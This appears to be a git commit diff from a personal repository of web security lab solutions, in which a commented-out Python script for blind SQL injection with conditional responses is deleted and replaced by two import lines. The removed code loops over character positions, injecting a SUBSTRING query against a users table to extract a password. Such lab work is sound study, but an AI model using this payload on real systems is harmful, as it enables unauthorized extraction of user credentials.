0fb881c2752c4fd9f04cdca389b4df84a7ab8286
madi <madimirzakup@gmail.com>
2024-12-27 21:16:50 +0500

    #

--- Server Side Topics/SQLi/Blind SQL injection with conditional responses/payload.py
+++ Server Side Topics/SQLi/Blind SQL injection with conditional responses/payload.py
@@ -1,14 +1,2 @@
-"""
-for i in range(1, 21): 
-    for char in "abcdefghijklmnopqrstuvwxyz0123456789":
-        payload = f"' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username = '{username}') = '{char}'--"
-        response = requests.get(url, params={"input": payload})
-        
-        if "Success" in response.text:  
-            password += char
-            print(f"[+] Found character {i}: {char}")
-            break
-
-print(f"Password: {password}")
-"""
-# in process
+import requests
+import os
